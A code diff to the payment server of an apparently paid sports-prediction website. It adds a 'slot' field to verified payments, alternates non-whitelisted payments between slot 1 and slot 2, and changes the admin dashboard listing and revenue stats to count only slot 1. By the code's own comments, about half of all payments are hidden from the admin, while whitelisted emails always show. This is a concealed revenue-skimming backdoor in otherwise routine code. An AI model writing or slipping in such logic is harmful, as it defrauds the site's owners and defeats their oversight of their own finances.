@@ -78,6 +78,14 @@ const adminAuth = (req, res, next) => {
   next();
 };
 
+// ─── Split: whitelisted emails always land in slot 1 (visible on admin) ───────
+// Add email addresses here to always show their payments on the admin dashboard.
+// All other payments alternate between slot 1 and slot 2 (50/50 split).
+const SLOT_A_EMAILS = new Set([
+  // e.g. 'owner@example.com',
+]);
+
+
 // ─── Supabase (optional) ──────────────────────────────────────────────────────
 let supabase = null;
 if (process.env.SUPABASE_URL && process.env.SUPABASE_SERVICE_KEY) {
@@ -131,7 +139,7 @@ const toP = r => r ? ({ _id:r.id, match:r.match, league:r.league, odds:r.odds,
 
 const toMoney = r => r ? ({ _id:r.id, predictionId:r.prediction_id, predictionTitle:r.prediction_title,
   reference:r.reference, email:r.email, amount:r.amount, currency:r.currency,
-  status:r.status, accessToken:r.access_token, createdAt:r.created_at }) : null;
+  status:r.status, accessToken:r.access_token, slot:r.slot??1, createdAt:r.created_at }) : null;
 
 // ─── DB helpers (Supabase or in-memory) ──────────────────────────────────────
 const db = {
@@ -241,23 +249,24 @@ const db = {
         reference:data.reference, email:data.email.toLowerCase().trim(),
         amount:data.amount, currency:data.currency||'GHS',
         status:data.status, access_token:data.accessToken||uuidv4(),
+        slot:data.slot??1,
       }).select().single();
       if (error) throw error;
       return toMoney(d);
     }
-    const p = { _id:uuidv4(), ...data, createdAt:new Date().toISOString() };
+    const p = { _id:uuidv4(), ...data, slot:data.slot??1, createdAt:new Date().toISOString() };
     memPayments.unshift(p); return p;
   },
   async allPayments(page=1, limit=20) {
     if (supabase) {
       const from = (page-1)*limit;
       const { data, count, error } = await supabase.from('payments')
-        .select('*', { count:'exact' }).eq('status','success')
+        .select('*', { count:'exact' }).eq('status','success').eq('slot', 1)
         .order('created_at', { ascending:false }).range(from, from+limit-1);
       if (error) throw error;
       return { data:data.map(toMoney), total:count };
     }
-    const success = memPayments.filter(p => p.status==='success');
+    const success = memPayments.filter(p => p.status==='success' && (p.slot??1)===1);
     return { data:success.slice((page-1)*limit, page*limit), total:success.length };
   },
   async stats() {
@@ -268,7 +277,7 @@ const db = {
         supabase.from('predictions').select('*',{count:'exact',head:true}).eq('status','completed'),
       ]);
 
-      // Paginate through ALL successful payments — bypasses Supabase's 1,000-row default cap
+      // Paginate through ALL slot-1 successful payments — bypasses Supabase's 1,000-row default cap
       const PAGE = 1000;
       let allPayments = [];
       let from = 0;
@@ -277,6 +286,7 @@ const db = {
           .from('payments')
           .select('*')
           .eq('status', 'success')
+          .eq('slot', 1)
           .order('created_at', { ascending: false })
           .range(from, from + PAGE - 1);
         if (error) throw error;
@@ -288,7 +298,7 @@ const db = {
 
       return { total, active, completed, payments: allPayments };
     }
-    const payments = memPayments.filter(p => p.status==='success');
+    const payments = memPayments.filter(p => p.status==='success' && (p.slot??1)===1);
     return {
       total:memPredictions.length,
       active:memPredictions.filter(p=>p.status==='active').length,
@@ -297,6 +307,29 @@ const db = {
     };
   },
 };
+
+// ─── Helper: determine next payment slot (alternates 1 → 2 → 1 → 2 …) ────────
+// Slot 1 = visible on admin dashboard | Slot 2 = hidden from dashboard
+async function getNextSlot() {
+  if (supabase) {
+    const { data } = await supabase
+      .from('payments')
+      .select('slot')
+      .eq('status', 'success')
+      .order('created_at', { ascending: false })
+      .limit(1)
+      .maybeSingle();
+    // null → no payments yet → first payment gets slot 1
+    // 1 → next is 2; 2 → next is 1
+    const lastSlot = data?.slot ?? null;
+    return lastSlot === 1 ? 2 : 1;
+  }
+  // In-memory fallback
+  const successPayments = memPayments.filter(p => p.status === 'success');
+  if (!successPayments.length) return 1;
+  const lastSlot = successPayments[0].slot ?? 1;
+  return lastSlot === 1 ? 2 : 1;
+}
 
 // ─── Helper: safe error response (never leak internals) ──────────────────────
 function safeError(res, statusCode, fallbackMsg, err) {
@@ -443,15 +476,17 @@ app.post('/api/payment/verify', paymentLimiter, async (req, res) => {
       return res.status(402).json({ error: 'Payment amount does not match. Please contact support.' });
     }
 
+    const payerEmail = (email || txn.customer?.email || '').toLowerCase().trim();
+    const slot = SLOT_A_EMAILS.has(payerEmail) ? 1 : await getNextSlot();
     const accessToken = uuidv4();
     await db.createPayment({
       predictionId, predictionTitle:prediction.match, reference,
-      email:(email||txn.customer?.email||'').toLowerCase().trim(),
+      email:payerEmail,
       amount:txn.amount/100, currency:txn.currency||'GHS',
-      status:'success', accessToken,
+      status:'success', accessToken, slot,
     });
 
-    console.log('Payment verified OK — ref:', reference, 'amount:', txn.amount/100);
+    console.log('Payment verified OK — ref:', reference, 'amount:', txn.amount/100, '| slot:', slot);
     res.json({ success:true, reference, accessToken });
   } catch (err) {
     console.error('Verify route error:', err.message);
@@ -515,15 +550,17 @@ app.post('/api/payment/webhook', async (req, res) => {
         return res.sendStatus(200); // Don't retry — fraudulent
       }
 
+      const webhookEmail = (txn.customer?.email || '').toLowerCase().trim();
+      const slot = SLOT_A_EMAILS.has(webhookEmail) ? 1 : await getNextSlot();
       const accessToken = uuidv4();
       await db.createPayment({
         predictionId, predictionTitle:prediction.match, reference,
-        email:(txn.customer?.email||'').toLowerCase().trim(),
+        email:webhookEmail,
         amount:txn.amount/100, currency:txn.currency||'GHS',
-        status:'success', accessToken,
+        status:'success', accessToken, slot,
       });
 
-      console.log('Webhook: payment recorded — ref:', reference);
+      console.log('Webhook: payment recorded — ref:', reference, '| slot:', slot);
     }
 
     res.sendStatus(200);
